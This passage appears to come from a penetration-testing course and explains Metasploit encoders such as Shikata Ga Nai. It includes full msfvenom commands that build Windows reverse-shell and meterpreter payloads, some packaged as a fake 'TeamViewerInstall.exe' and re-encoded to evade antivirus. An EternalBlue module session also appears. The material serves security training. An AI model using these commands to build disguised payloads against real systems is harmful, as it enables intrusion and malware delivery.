`Encoders` come into play with the role of changing the payload to run on different operating systems and architectures. These architectures include:

|`x64`|`x86`|`sparc`|`ppc`|`mips`|
|---|---|---|---|---|

They are also needed to remove hexadecimal opcodes known as `bad characters` from the payload. Not only that but encoding the payload in different formats could help with the AV detection as mentioned above. However, the use of encoders strictly for AV evasion has diminished over time, as IPS/IDS manufacturers have improved how their protection software deals with signatures in malware and viruses.

Shikata Ga Nai (`SGN`) is one of the most utilized Encoding schemes today because it is so hard to detect that payloads encoded through its mechanism are not universally undetectable anymore. Far from it. The name (`仕方がない`) means `It cannot be helped` or `Nothing can be done about it`, and rightfully so if we were reading this a few years ago. However, there are other methodologies we will explore to evade protection systems. [This article from FireEye](https://www.fireeye.com/blog/threat-research/2019/10/shikata-ga-nai-encoder-still-going-strong.html) details the why and the how of Shikata Ga Nai's previous rule over the other encoders.

## Selecting an Encoder

Before 2015, the Metasploit Framework had different submodules that took care of payloads and encoders. They were packed separately from the msfconsole script and were called `msfpayload` and `msfencode`. These two tools are located in `/usr/share/framework2/`.

If we wanted to create our custom payload, we could do so through `msfpayload`, but we would have to encode it according to the target OS architecture using `msfencode` afterward. A pipe would take the output from one command and feed it into the next, which would generate an encoded payload, ready to be sent and run on the target machine.

  Encoders

```shell-session
alakin2504@htb[/htb]$ msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai

[*] x86/shikata_ga_nai succeeded with size 1636 (iteration=1)
```

After 2015, updates to these scripts have combined them within the `msfvenom` tool, which takes care of payload generation and Encoding. We will be talking about `msfvenom` in detail later on. Below is an example of what payload generation would look like with today's `msfvenom`:

#### Generating Payload - Without Encoding

```shell-session
alakin2504@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl

Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai chosen with final size 381
Payload size: 381 bytes
Final size of perl file: 1674 bytes
```
We should now look at the first line of the `$buf` and see how it changes when applying an encoder like `shikata_ga_nai`.

#### Generating Payload - With Encoding

```shell-session
alakin2504@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai

Found 1 compatible encoders
Attempting to encode payload with 3 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 326 (iteration=0)
x86/shikata_ga_nai succeeded with size 353 (iteration=1)
x86/shikata_ga_nai succeeded with size 380 (iteration=2)
x86/shikata_ga_nai chosen with final size 380
```

If we want to look at the functioning of the `shikata_ga_nai` encoder, we can look at an excellent post [here](https://hatching.io/blog/metasploit-payloads2/).

Suppose we want to select an Encoder for an `existing payload`. Then, we can use the `show encoders` command within the `msfconsole` to see which encoders are available for our current `Exploit module + Payload` combination.

```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload 15

payload => windows/x64/meterpreter/reverse_tcp


msf6 exploit(windows/smb/ms17_010_eternalblue) > show encoders

Compatible Encoders
===================

   #  Name              Disclosure Date  Rank    Check  Description
   -  ----              ---------------  ----    -----  -----------
   0  generic/eicar                      manual  No     The EICAR Encoder
   1  generic/none                       manual  No     The "none" Encoder
   2  x64/xor                            manual  No     XOR Encoder
   3  x64/xor_dynamic                    manual  No     Dynamic key XOR Encoder
   4  x64/zutto_dekiru                   manual  No     Zutto Dekiru
```

In the previous example, we only see a few encoders fit for x64 systems. Like the available payloads, these are automatically filtered according to the Exploit module only to display the compatible ones. For example, let us try the `MS09-050 Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference Exploit`

```shell-session
msf6 exploit(ms09_050_smb2_negotiate_func_index) > show encoders

   x86/unicode_upper                        manual     Alpha2 Alphanumeric Unicode Uppercase Encoder
```

Take the above example just as that—a hypothetical example. If we were to encode an executable payload only once with SGN, it would most likely be detected by most antiviruses today. Let's delve into that for a moment. Picking up `msfvenom`, the subscript of the Framework that deals with payload generation and Encoding schemes, we have the following input:

```shell-session
alakin2504@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe

Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 368 (iteration=0)
x86/shikata_ga_nai chosen with final size 368
Payload size: 368 bytes
Final size of exe file: 73802 bytes
Saved as: TeamViewerInstall.exe
```

One better option would be to try running it through multiple iterations of the same Encoding scheme:

```shell-session
alakin2504@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe

Found 1 compatible encoders
Attempting to encode payload with 10 iterations of x86/shikata_ga_nai

Payload size: 611 bytes
Final size of exe file: 73802 bytes
Error: Permission denied @ rb_sysopen - /root/Desktop/TeamViewerInstall.exe
```

As we can see, it is still not enough for AV evasion. There is a high number of products that still detect the payload. Alternatively, Metasploit offers a tool called `msf-virustotal` that we can use with an API key to analyze our payloads. However, this requires free registration on VirusTotal.
